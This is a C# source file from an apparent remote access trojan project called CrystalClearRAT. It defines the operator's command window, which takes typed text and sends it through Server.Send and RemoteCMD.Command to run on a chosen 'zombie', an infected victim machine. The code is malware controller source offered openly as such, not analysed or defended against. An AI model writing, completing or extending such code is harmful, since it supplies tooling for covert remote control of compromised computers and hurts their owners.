using CrystalClearRAT.Functions;
using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Interaction logic for CommandWindow.xaml
    /// </summary>
    public partial class CommandWindow : Window
    {

        private Zombie zombie;

        public CommandWindow(Zombie zombie)
        {
            this.zombie = zombie;
            InitializeComponent();
        }
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Server.Send(RemoteCMD.Command(commandTextBox.Text), zombie);
            commandTextBox.Text = string.Empty;

        }

        private void commandTextBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            if (string.IsNullOrEmpty(commandTextBox.Text))
                sendButton.IsEnabled = false;
            else
            {
                sendButton.IsEnabled = true;
            }
        }
    }
}
